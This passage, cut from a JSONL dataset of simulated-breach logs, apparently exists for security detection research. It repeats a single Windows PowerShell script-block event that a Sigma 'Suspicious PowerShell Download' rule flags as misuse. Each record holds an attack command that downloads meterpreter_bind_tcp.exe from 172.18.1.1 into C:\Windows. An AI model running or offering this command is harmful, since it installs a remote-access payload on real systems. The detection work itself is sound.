6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": 